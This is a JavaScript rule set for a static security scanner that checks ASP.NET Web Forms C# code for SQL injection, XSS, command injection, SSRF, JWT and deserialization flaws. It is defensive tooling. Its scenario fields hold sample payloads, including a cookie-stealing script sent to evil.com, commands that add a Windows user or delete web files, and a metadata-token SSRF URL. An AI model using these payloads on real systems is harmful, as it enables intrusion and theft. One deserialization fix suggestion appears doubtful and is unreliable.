/**
 * rules-aspx-cs.js
 * Security rules for ASP.NET Web Forms code-behind (C#).
 * Covers: .aspx.cs, .ascx.cs, .master.cs, and general .cs files in web projects.
 * Based on OWASP Top 10 patterns common in Generation 1 / classic ASP.NET codebases.
 */

// ── SQL Injection ─────────────────────────────────────────────────────────────

const INJECTION_RULES = [
  {
    id: 'CS-INJ-001',
    name: 'SQL Injection – string concatenation in SqlCommand',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches: new SqlCommand( ... "string" + variable  (handles multi-line)
    pattern: /new\s+SqlCommand\s*\([\s\S]{0,400}["'][^"']*["']\s*\+\s*\w+/g,
    antipattern: /SqlParameter|Parameters\.Add|Parameters\.AddWithValue/i,
    lookahead: 400,
    why: 'Building a SqlCommand by concatenating strings with user input allows an attacker to inject arbitrary SQL. The database executes whatever SQL is constructed — including UNION SELECT, DROP TABLE, or authentication bypass.',
    scenario: "User enters ' OR '1'='1 in a login field. The query becomes WHERE username='' OR '1'='1' AND password='' — returning all users and bypassing authentication entirely.",
    fix: "Use parameterized queries: SqlCommand cmd = new SqlCommand(\"SELECT * FROM Users WHERE username=@user AND password=@pass\", conn); cmd.Parameters.AddWithValue(\"@user\", username); cmd.Parameters.AddWithValue(\"@pass\", password);",
    fileTypes: ['cs'],
  },
  {
    id: 'CS-INJ-002',
    name: 'SQL Injection – string.Format used to build query',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches: string.Format("SELECT/INSERT/UPDATE/DELETE ... {0}", ...)
    pattern: /string\.Format\s*\(\s*["'][^"']{0,20}(?:SELECT|INSERT|UPDATE|DELETE|WHERE|FROM)[^"']{0,200}\{[0-9]\}[^"']{0,100}["']/gi,
    antipattern: /SqlParameter|Parameters\.Add/i,
    lookahead: 300,
    why: 'string.Format substitutes values positionally into the SQL string before it reaches the database driver. The driver sees a complete SQL string with no way to distinguish data from structure — identical to direct concatenation.',
    scenario: 'Query becomes SELECT * FROM Anstallda WHERE nPersID = 1 OR 1=1 when attacker passes "1 OR 1=1" as the id parameter. All employee records are returned.',
    fix: 'Replace string.Format SQL construction with SqlParameter: cmd.Parameters.AddWithValue("@id", id); Never use string.Format, string.Concat, or interpolation to build SQL queries.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-INJ-003',
    name: 'SQL Injection – C# string interpolation in query',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches: $"SELECT ... {variable}" — C# string interpolation in SQL
    // Note: \$ matches literal dollar sign in the source file
    pattern: /\$"[^"\n]{0,20}(?:SELECT|INSERT|UPDATE|DELETE|WHERE|FROM)[^"\n]{0,200}\{[^}"\n]{1,60}\}/gi,
    antipattern: /SqlParameter|Parameters\.Add/i,
    lookahead: 300,
    why: 'C# string interpolation ($"...{var}...") is syntactic sugar for string concatenation. The resulting string is passed to the database as-is — the interpolated values are not parameterized.',
    scenario: 'An attacker submits search=\' UNION SELECT username,password FROM Users-- causing the interpolated query to return credentials from the Users table alongside normal results.',
    fix: 'Never use $"..." interpolation to build SQL. Use parameterized queries exclusively. Consider using an ORM (Entity Framework, Dapper) which parameterizes by default.',
    fileTypes: ['cs'],
  },
];

// ── Open Redirect ─────────────────────────────────────────────────────────────

const REDIRECT_RULES = [
  {
    id: 'CS-REDIRECT-001',
    name: 'Open redirect – Response.Redirect with unvalidated Request value',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // Matches: Response.Redirect(Request.QueryString[...]) — direct use
    // Also catches the common two-line pattern via CS-REDIRECT-002
    pattern: /Response\.Redirect\s*\(\s*Request\s*\.\s*(?:QueryString|Form|Params|Url|RawUrl)\b/gi,
    why: 'Passing a Request value directly to Response.Redirect allows an attacker to redirect users to any URL after a legitimate action. Commonly used for phishing and credential harvesting.',
    scenario: 'Attacker sends victim a link: /Login.aspx?returnUrl=https://evil.com/fake-login. After authenticating, the user is silently redirected to the phishing site.',
    fix: 'Validate redirect URLs before use: if (Uri.IsWellFormedUriString(returnUrl, UriKind.Relative)) Response.Redirect(returnUrl); else Response.Redirect("~/Default.aspx"); Never redirect to absolute URLs taken from user input.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-REDIRECT-002',
    name: 'Open redirect – Response.Redirect with unvalidated variable',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // Matches: Response.Redirect(variable) where variable was assigned from Request
    // Catches: string x = Request.QueryString["x"]; Response.Redirect(x);
    pattern: /Response\.Redirect\s*\(\s*(?:returnUrl|backUrl|backurl|redirectUrl|redirect|next|returnTo|goto)\s*\)/gi,
    why: 'Variables named returnUrl, backUrl, redirect etc. are almost always populated from Request parameters. Passing them to Response.Redirect without validation creates an open redirect.',
    scenario: 'Common pattern in login pages: user is redirected to returnUrl after login. Attacker distributes a URL with returnUrl pointing to a credential-harvesting page.',
    fix: 'Always validate redirect destinations: use a whitelist of allowed paths, or check that the URL is a relative path using Uri.IsWellFormedUriString(url, UriKind.Relative).',
    fileTypes: ['cs'],
  },
];

// ── Path Traversal ────────────────────────────────────────────────────────────

const PATH_RULES = [
  {
    id: 'CS-PATH-001',
    name: 'Path traversal – user input used directly in file path',
    severity: 'CRITICAL',
    category: 'Broken Access Control (OWASP A01)',
    // Matches File I/O where the path variable was built from Request input nearby.
    // Two patterns: Request assigned then File used, or direct Request in File call.
    pattern: /File\s*\.\s*(?:ReadAllText|ReadAllBytes|WriteAllText|WriteAllBytes|Delete|Move|Copy|Open|AppendAllText)\s*\([^;)]{0,100}(?:Request\s*\.\s*(?:QueryString|Form|Params)\s*\[|\w*(?:file|path|name|doc)\w*)/gi,
    why: 'Using user-supplied filenames with File I/O operations without path validation allows attackers to read or write arbitrary files on the server using directory traversal sequences (../).',
    scenario: 'Attacker sends ?file=../../Web.config. Server reads and returns the Web.config file containing database connection strings, passwords, and application secrets.',
    fix: 'Validate and sanitize file paths: (1) Use Path.GetFileName() to strip directory components. (2) Resolve the full path with Path.GetFullPath() and verify it starts with the expected base directory. (3) Never pass user input directly to File methods.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-PATH-002',
    name: 'Path traversal – Path.Combine with user input',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    // Matches: Path.Combine( with user-influenced path variable (common variable names)
    // Uses [\s\S] because Server.MapPath("...") inside the call contains ) which breaks [^;)]
    pattern: /Path\.Combine\s*\([\s\S]{0,200}(?:Request\s*\.\s*(?:QueryString|Form|Params)\s*\[|\b(?:fileName|docName|filePath|userInput|inputPath)\b)/gi,
    why: 'Path.Combine does not sanitize its inputs. If the user-supplied segment is an absolute path (e.g. C:\\Windows\\), Path.Combine ignores the base path entirely. Directory traversal with ../ also works.',
    scenario: 'Path.Combine("C:\\Uploads\\", "..\\..\\Web.config") resolves to C:\\Web.config. Attacker reads server configuration files by manipulating the filename parameter.',
    fix: 'After Path.Combine, verify the resolved path starts with the intended base: string full = Path.GetFullPath(Path.Combine(baseDir, userInput)); if (!full.StartsWith(baseDir)) throw new UnauthorizedAccessException();',
    fileTypes: ['cs'],
  },
];

// ── Cryptography ──────────────────────────────────────────────────────────────

const CRYPTO_RULES = [
  {
    id: 'CS-CRYPTO-001',
    name: 'Weak hashing – MD5 used for passwords or sensitive data',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /MD5\s*\.\s*Create\s*\(\s*\)|new\s+MD5CryptoServiceProvider\s*\(\s*\)|MD5\.HashData/gi,
    why: 'MD5 is cryptographically broken. MD5 hashes can be reversed via precomputed rainbow tables in seconds. It was never designed for password storage — it is a checksum algorithm optimized for speed.',
    scenario: 'A database breach exposes MD5-hashed passwords. Attackers run the hashes through freely available rainbow table lookups (e.g. crackstation.net) and recover most passwords within minutes.',
    fix: 'Use BCrypt, Argon2, or PBKDF2 for password hashing: using var hasher = new PasswordHasher<string>(); string hash = hasher.HashPassword(null, password); For .NET 6+: use Rfc2898DeriveBytes with SHA-256 and at least 100,000 iterations.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-CRYPTO-002',
    name: 'Weak hashing – SHA1 used for passwords or sensitive data',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /SHA1\s*\.\s*Create\s*\(\s*\)|new\s+SHA1(?:Managed|CryptoServiceProvider)\s*\(\s*\)|SHA1\.HashData/gi,
    why: 'SHA1 is insufficient for password storage. While more resistant than MD5, SHA1 is still vulnerable to GPU-accelerated brute force attacks. Billions of SHA1 hashes can be tested per second on consumer hardware.',
    scenario: 'Attacker with a database dump and a consumer GPU can crack simple SHA1 passwords in minutes using hashcat. Common passwords ("Password1!", "Welcome123") fall within seconds.',
    fix: 'Replace SHA1 with a proper password hashing algorithm. Use BCrypt (BCrypt.Net-Next package) or ASP.NET Identity\'s PasswordHasher which uses PBKDF2-SHA256 with 100,000 iterations by default.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-CRYPTO-003',
    name: 'Hardcoded encryption key or IV',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    // Matches: Encoding.X.GetBytes("hardcoded string") assigned anywhere near Key/IV usage
    // Also matches direct: anyObj.Key = Encoding... or .IV = new byte[]{...}
    pattern: /Encoding\.\w+\.GetBytes\s*\(\s*["'][^"']{3,50}["']\s*\)|\.(?:Key|IV)\s*=\s*(?:Encoding\.\w+\.GetBytes\s*\(\s*["']|new\s+byte\s*\[\s*\]\s*\{)/gi,
    why: 'Hardcoded cryptographic keys provide no real security — anyone with access to the source code, binary, or decompiler has the key. The encryption is effectively theatre.',
    scenario: 'Attacker decompiles the .NET assembly (trivial with tools like dnSpy or ILSpy) and extracts the hardcoded key. All encrypted data in the database can now be decrypted.',
    fix: 'Store encryption keys outside the application: use Windows DPAPI, Azure Key Vault, AWS KMS, or at minimum environment variables / encrypted app settings. Never hardcode key material in source.',
    fileTypes: ['cs'],
  },
];

// ── Authentication / Session ──────────────────────────────────────────────────

const AUTH_RULES = [
  {
    id: 'CS-AUTH-001',
    name: 'Cookie missing HttpOnly and/or Secure flag',
    severity: 'HIGH',
    category: 'Identification and Authentication Failures (OWASP A07)',
    // Matches: new HttpCookie(...) without subsequent .HttpOnly = true
    pattern: /new\s+HttpCookie\s*\(/gi,
    antipattern: /\.HttpOnly\s*=\s*true/i,
    lookahead: 400,
    why: 'Cookies without HttpOnly can be read by JavaScript — any XSS vulnerability immediately leads to session theft. Cookies without Secure are transmitted over HTTP, allowing interception on any non-HTTPS connection.',
    scenario: 'Application has an XSS vulnerability (common in this class of codebase). Attacker injects document.location="https://evil.com?c="+document.cookie. Every visitor\'s auth cookie is stolen and their session hijacked.',
    fix: 'Always set both flags: HttpCookie cookie = new HttpCookie("AuthToken", value); cookie.HttpOnly = true; cookie.Secure = true; cookie.SameSite = SameSiteMode.Strict; Also configure globally in Web.config: <httpCookies httpOnlyCookies="true" requireSSL="true" />',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-AUTH-002',
    name: 'Session fixation – session not regenerated after authentication',
    severity: 'HIGH',
    category: 'Identification and Authentication Failures (OWASP A07)',
    // Matches: Session["username"] or Session["isAuthenticated"] set without Session.Abandon() nearby
    pattern: /Session\s*\[\s*["'](?:username|isAuthenticated|userId|user|loggedIn|authenticated|role)["']\s*\]\s*=/gi,
    antipattern: /Session\.Abandon\s*\(\s*\)|SessionIDManager|RegenerateId/i,
    lookahead: 500,
    why: 'Setting session values without first abandoning the old session allows session fixation attacks. An attacker can pre-establish a session ID, wait for a victim to authenticate, and then use the now-authenticated session.',
    scenario: 'Attacker forces victim to use a known session ID via URL manipulation. Victim logs in — session ID remains the same but is now authenticated. Attacker uses that session ID to access the victim\'s account.',
    fix: 'Before setting any session values after authentication: Session.Abandon(); Then create a new session. In ASP.NET: Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId", "")); to force a new session ID.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-AUTH-003',
    name: 'Password stored in Session or ViewState',
    severity: 'CRITICAL',
    category: 'Identification and Authentication Failures (OWASP A07)',
    // Matches: Session["password"] = or ViewState["password"] =
    pattern: /(?:Session|ViewState)\s*\[\s*["'][^"']{0,10}(?:password|passwd|pwd|pass)[^"']{0,10}["']\s*\]\s*=/gi,
    why: 'Storing passwords in Session or ViewState keeps them in memory and potentially serialized to disk (session state server, SQL session state). Session data can be exposed through other vulnerabilities or server compromise.',
    scenario: 'A session state database is compromised or a session fixation attack succeeds. Attacker not only gets the victim\'s session but also their plaintext password, enabling account takeover across all services where the same password is reused.',
    fix: 'Never store passwords after authentication. Authenticate once, store only a user identifier and role. If re-authentication is needed for sensitive operations, prompt for the password again — do not cache it.',
    fileTypes: ['cs'],
  },
];

// ── Command Injection ─────────────────────────────────────────────────────────

const CMD_RULES = [
  {
    id: 'CS-CMD-001',
    name: 'Command injection – Process.Start with user input',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches: Process.Start(...) with Request value or variable concatenation
    pattern: /Process\.Start\s*\([^;]{0,200}(?:Request\s*\.\s*(?:QueryString|Form|Params)\s*\[|\+\s*\w+(?:Name|Input|Param|Arg|Value|Host|Cmd|Command))/gi,
    why: 'Passing user input to Process.Start allows arbitrary command execution on the server. An attacker can run any command the application process has permission to execute.',
    scenario: 'Attacker submits report=report.bat & net user hacker Password123! /add. The server creates a new Windows user account. With further commands, they can escalate to full system compromise.',
    fix: 'Avoid Process.Start with any user-controlled data. If external processes are required, use a strict whitelist of allowed commands/arguments validated against a regex or enum. Never pass raw user input to shell commands.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-CMD-002',
    name: 'Command injection – ProcessStartInfo with user input in Arguments',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches: psi.Arguments = "..." + variable or psi.Arguments with Request
    pattern: /(?:psi|startInfo|processInfo|info)\s*\.\s*Arguments\s*=\s*[^;]{0,150}(?:\+\s*\w+|\+\s*Request\.)/gi,
    why: 'Setting ProcessStartInfo.Arguments with user input and string concatenation is equivalent to shell injection. Arguments are passed to the shell for interpretation, allowing injection of additional commands.',
    scenario: 'host = "8.8.8.8 & del C:\\inetpub\\wwwroot\\* /Q" causes the server to delete all web application files after executing the ping command.',
    fix: 'Use ProcessStartInfo with UseShellExecute = false and pass arguments as separate elements where the API allows it. Validate input against a strict whitelist (e.g. IP address regex for a ping function).',
    fileTypes: ['cs'],
  },
];

// ── Hardcoded secrets ─────────────────────────────────────────────────────────

const SECRET_RULES = [
  {
    id: 'CS-SECRET-001',
    name: 'Hardcoded connection string with credentials in source code',
    severity: 'CRITICAL',
    category: 'Sensitive Data Exposure (OWASP A02)',
    // Matches full connection string literals containing both Server= and Password=
    // Handles both regular quotes and C#-escaped quotes (\") in string literals
    // Avoids matching SQL WHERE clauses that mention password= without server context
    pattern: /(?:\\"|"|\')[^"'\n]{0,300}Server\s*=[^"'\n]{0,200}Password\s*=[^;"'\n]{1,80}/gi,
    antipattern: /ConfigurationManager|appSettings|connectionStrings|Environment\.GetEnvironmentVariable/i,
    lookahead: 20,
    why: 'Hardcoded credentials in source code are committed to version control, visible in compiled assemblies (trivially decompiled), and cannot be rotated without a code change and redeployment.',
    scenario: 'Developer pushes code to GitHub. Automated scanner finds "Password=Passw0rd123" within minutes. Attacker connects directly to the production SQL Server database.',
    fix: 'Use Web.config connectionStrings section (encrypted with aspnet_regiis) or environment variables. Never hardcode credentials in .cs files. Rotate any credentials that have ever been hardcoded immediately.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-SECRET-002',
    name: 'Hardcoded password in source code',
    severity: 'CRITICAL',
    category: 'Sensitive Data Exposure (OWASP A02)',
    // Matches: string adminPassword = "..." or password = "literal"
    pattern: /(?:string|var)\s+\w*[Pp]assword\w*\s*=\s*["'][^"']{3,50}["']/g,
    antipattern: /Request\.|Session\[|ConfigurationManager|Environment\.|GetPassword|ReadPassword|HashPassword/i,
    lookahead: 10,
    why: 'Hardcoded passwords are a permanent backdoor. Unlike a stolen session token, a hardcoded password cannot be invalidated without a code change. It also signals that the application uses shared/static credentials.',
    scenario: 'string adminPassword = "SuperSecret123!" is found in a code review, decompiled assembly, or leaked repository. All instances of the application share this password with no way to revoke access for a specific user.',
    fix: 'Remove all hardcoded passwords. Use ASP.NET Identity or a proper authentication system with per-user credentials stored as hashed values. For service-to-service authentication, use managed identities or secrets management.',
    fileTypes: ['cs'],
  },
];

// ── XSS / Output encoding ─────────────────────────────────────────────────────

const XSS_RULES = [
  {
    id: 'CS-XSS-001',
    name: 'XSS – Response.Write with unencoded user input',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    // Matches: Response.Write(...) with Request. or string concatenation
    pattern: /Response\.Write\s*\([^;]{0,200}Request\s*\.\s*(?:QueryString|Form|Params)\s*\[/gi,
    antipattern: /Server\.HtmlEncode|HttpUtility\.HtmlEncode|WebUtility\.HtmlEncode|AntiXss\./i,
    lookahead: 20,
    why: 'Response.Write outputs content directly to the HTTP response. Without encoding, any HTML or script in the user input is executed by the victim\'s browser.',
    scenario: 'URL: /Search.aspx?q=<script>document.location="https://evil.com?c="+document.cookie</script>. Page renders the script tag verbatim. Every user who follows this link has their session stolen.',
    fix: 'Encode before output: Response.Write(Server.HtmlEncode(Request.QueryString["q"])); Or use <%: expr %> in markup. For rich output, use a whitelist HTML sanitizer.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-XSS-002',
    name: 'XSS – Label.Text or Literal.Text set with unencoded user input',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    // Matches: label.Text = Request.Form/QueryString  OR  label.Text = ex.ToString()
    pattern: /\w+\.Text\s*(?:\+=|=)\s*[^;\n]{0,150}(?:Request\s*\.\s*(?:QueryString|Form|Params)\s*\[|ex\.\s*(?:ToString|Message|StackTrace))/gi,
    antipattern: /Server\.HtmlEncode|HttpUtility\.HtmlEncode|AntiXss\./i,
    lookahead: 20,
    why: 'Setting .Text on a Label or Literal control with user input renders it as raw HTML unless the control has Encode=true. Literal controls in particular render exactly what they receive.',
    scenario: 'lblError.Text = Request.Form["name"] renders unescaped HTML. Attacker submits name=<img src=x onerror=alert(document.cookie)> and the XSS payload executes for all users who see the error message.',
    fix: 'Use Server.HtmlEncode: label.Text = Server.HtmlEncode(Request.Form["name"]); Or use asp:Label which HTML-encodes by default when setting Text programmatically via data-binding with <%# %> syntax.',
    fileTypes: ['cs'],
  },
];

// ── Error handling ────────────────────────────────────────────────────────────

const ERROR_RULES = [
  {
    id: 'CS-ERR-001',
    name: 'Exception details exposed to user via Response.Write',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // Matches: Response.Write(ex.ToString() or ex.Message) in catch blocks
    pattern: /catch\s*\([^)]{0,50}\)\s*\{[^}]{0,300}Response\.Write\s*\([^;]{0,100}(?:ex\.|exception\.|err\.)/gi,
    why: 'Writing exception details to the HTTP response exposes: stack traces with file paths, source code snippets, SQL queries, internal class/method names, server configuration details. This is reconnaissance gold for an attacker.',
    scenario: 'A SQL error exposes the full query including table structure. A file I/O error reveals C:\\inetpub\\wwwroot\\App\\ paths. Combined with other vulnerabilities, this information accelerates exploitation significantly.',
    fix: 'Log exceptions server-side and show only a generic message to the user: catch (Exception ex) { Logger.Error(ex); Response.Redirect("~/Error.aspx"); } Never write ex.ToString() or ex.Message to Response.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-ERR-002',
    name: 'Exception details exposed via Label.Text or control',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // Matches: label.Text = ex.ToString() or ex.Message in catch blocks
    pattern: /catch\s*\([^)]{0,50}\)\s*\{[^}]{0,300}\w+\.Text\s*=\s*[^;]{0,100}(?:ex\.|exception\.|err\.)(?:ToString|Message|StackTrace)/gi,
    why: 'Rendering exception details in page controls (Label, Literal) is equivalent to Response.Write — the information is visible in the browser and in the HTML source.',
    scenario: 'lblError.Text = ex.ToString() renders the full stack trace including "at System.Data.SqlClient.SqlConnection.Open() in C:\\inetpub\\wwwroot\\App\\DB.cs:line 42" — exposing source paths and confirming the database library in use.',
    fix: 'Show a user-friendly error message, log the full exception internally: lblError.Text = "An error occurred. Please try again."; EventLog.WriteEntry("App", ex.ToString(), EventLogEntryType.Error);',
    fileTypes: ['cs'],
  },
];

// ── Exports ───────────────────────────────────────────────────────────────────

const ALL_RULES = [
  ...INJECTION_RULES,
  ...REDIRECT_RULES,
  ...PATH_RULES,
  ...CRYPTO_RULES,
  ...AUTH_RULES,
  ...CMD_RULES,
  ...SECRET_RULES,
  ...XSS_RULES,
  ...ERROR_RULES,
];

module.exports = { ALL_RULES };

// ── JWT ───────────────────────────────────────────────────────────────────────

const JWT_RULES = [
  {
    id: 'CS-JWT-001',
    name: 'JWT decoded without signature validation (ValidateSignature = false)',
    severity: 'CRITICAL',
    category: 'Broken Authentication (OWASP A07)',
    // System.IdentityModel.Tokens.Jwt: TokenValidationParameters with ValidateXxx = false
    pattern: /ValidateSignature\s*=\s*false|ValidateIssuerSigningKey\s*=\s*false|ValidateLifetime\s*=\s*false\s*[,}][\s\S]{0,200}ValidateSignature|RequireSignedTokens\s*=\s*false/gi,
    why: 'Setting ValidateSignature=false or ValidateIssuerSigningKey=false in TokenValidationParameters instructs the .NET JWT middleware to skip cryptographic verification. Any structurally valid JWT is accepted regardless of who signed it.',
    scenario: 'AI sets ValidateIssuerSigningKey = false to silence a key configuration error during development. Code ships. Attacker generates a token with role: "Admin" signed with a random key. ASP.NET accepts it and grants admin access.',
    fix: 'Always validate: new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey)), ValidateIssuer = true, ValidateAudience = true, ValidateLifetime = true }. Store the key in Azure Key Vault or environment variables.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-JWT-002',
    name: 'JWT algorithm "none" or empty signing key — signature bypass',
    severity: 'CRITICAL',
    category: 'Broken Authentication (OWASP A07)',
    // Matches: SecurityAlgorithms.None, or SymmetricSecurityKey with empty/hardcoded short key
    pattern: /SecurityAlgorithms\.None|new\s+SymmetricSecurityKey\s*\(\s*(?:new\s+byte\s*\[\s*\]|Encoding\.\w+\.GetBytes\s*\(\s*["']{2}\s*\)|Encoding\.\w+\.GetBytes\s*\(\s*["'][^"']{1,8}["']\s*\))/gi,
    why: 'Using SecurityAlgorithms.None produces unsigned tokens. A SymmetricSecurityKey built from an empty string or very short key provides trivially breakable security — the key can be brute-forced in seconds.',
    scenario: 'Key is created from an empty string: new SymmetricSecurityKey(Encoding.UTF8.GetBytes("")). All tokens share the same effectively-null key. Attacker uses the same empty key to forge tokens for any user.',
    fix: 'Use a cryptographically random key of at least 256 bits: var key = new byte[32]; RandomNumberGenerator.Fill(key); Store the key in Azure Key Vault or as an encrypted app setting. Never use empty, short, or hardcoded keys.',
    fileTypes: ['cs'],
  },
  {
    id: 'CS-JWT-003',
    name: 'JWT claims read from token without validation (JwtSecurityToken direct parse)',
    severity: 'HIGH',
    category: 'Broken Authentication (OWASP A07)',
    // Matches: new JwtSecurityToken(token) or JwtSecurityTokenHandler().ReadToken() without ValidateToken
    pattern: /new\s+JwtSecurityToken\s*\(\s*\w+\s*\)|JwtSecurityTokenHandler\s*\(\s*\)\s*\.\s*ReadToken\s*\(/gi,
    antipattern: /ValidateToken|TokenValidationParameters/i,
    lookahead: 400,
    why: 'Constructing a JwtSecurityToken directly or using ReadToken() reads the token structure without verifying the signature or validating claims. The token payload is attacker-controlled data until it has been cryptographically verified.',
    scenario: 'Code reads the user ID from token.Claims directly after ReadToken() without calling ValidateToken(). Attacker replaces the user ID in the token payload. Signature is never checked — any claim is trusted.',
    fix: 'Use ValidateToken() exclusively: var principal = handler.ValidateToken(token, validationParameters, out SecurityToken validatedToken). Only access claims from the returned ClaimsPrincipal, not from the raw token object.',
    fileTypes: ['cs'],
  },
];

module.exports.JWT_RULES = JWT_RULES;
module.exports.ALL_RULES = [...module.exports.ALL_RULES, ...JWT_RULES];

// ── SSRF (P3) ─────────────────────────────────────────────────────────────────

const SSRF_RULES = [
  {
    id: 'CS-SSRF-001',
    name: 'SSRF — user-controlled URL passed to HttpClient or WebClient',
    severity: 'HIGH',
    category: 'Server-Side Request Forgery (OWASP A10)',
    // httpClient.GetAsync(url) where url comes from Request
    // new WebClient().DownloadString(Request.QueryString["url"])
    pattern: /(?:httpClient|_httpClient|HttpClient|new\s+WebClient\s*\(\s*\))\s*(?:\.\s*(?:GetAsync|PostAsync|SendAsync|DownloadString|DownloadData|OpenRead)\s*\()\s*(?:Request\s*\.|await\s+)?[^;)]{0,120}(?:Request\.|QueryString|RouteValues|Form\[|Body)/gi,
    why: 'Passing request-supplied URLs to HttpClient or WebClient enables SSRF. In Azure and AWS environments, the instance metadata endpoint (169.254.169.254) exposes credentials and configuration. Internal services like SQL Server, Redis, or admin dashboards may also be reachable.',
    scenario: 'await httpClient.GetAsync(Request.Query["endpoint"]) to call a partner API. Attacker sends ?endpoint=http://169.254.169.254/metadata/identity/oauth2/token. Azure IMDS returns an access token for the VM\'s managed identity.',
    fix: 'Validate before requesting: var uri = new Uri(url); if (!AllowedHosts.Contains(uri.Host)) return Forbid(); Use HttpClient with a custom handler that rejects private IP ranges. In Azure, use Managed Identity for outbound calls — never proxy user-supplied URLs.',
    fileTypes: ['cs'],
  },
];

// ── Unsafe deserialization (P3) ───────────────────────────────────────────────

const DESER_RULES = [
  {
    id: 'CS-DESER-001',
    name: 'Unsafe deserialization — BinaryFormatter or LosFormatter with untrusted data',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A08)',
    // BinaryFormatter().Deserialize(stream), LosFormatter().Deserialize(data)
    // Also: ObjectStateFormatter, NetDataContractSerializer — all unsafe with untrusted input
    pattern: /new\s+(?:BinaryFormatter|LosFormatter|ObjectStateFormatter|NetDataContractSerializer)\s*\(\s*\)|(?:BinaryFormatter|LosFormatter|NetDataContractSerializer)\s+\w+\s*=\s*new/gi,
    why: 'BinaryFormatter and related formatters execute arbitrary code during deserialization via ISerializable callbacks and serialization surrogates. Microsoft has marked BinaryFormatter as permanently disabled in .NET 9 and dangerous in all previous versions. Any untrusted data deserialized with these types can achieve remote code execution.',
    scenario: 'BinaryFormatter().Deserialize(Request.InputStream) to restore a view model from a cookie or POST body. Attacker crafts a ysoserial.net gadget chain payload. Deserializing it executes arbitrary commands on the server with the application pool identity.',
    fix: 'Replace BinaryFormatter entirely. For new code use System.Text.Json or Newtonsoft.Json with a strict contract. For session/viewstate use DataContractSerializer with a known-types allowlist. Add AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowSimpleTypes", true) as defense-in-depth.',
    fileTypes: ['cs'],
  },
];

module.exports.SSRF_RULES  = SSRF_RULES;
module.exports.DESER_RULES = DESER_RULES;
module.exports.ALL_RULES   = [...module.exports.ALL_RULES, ...SSRF_RULES, ...DESER_RULES];
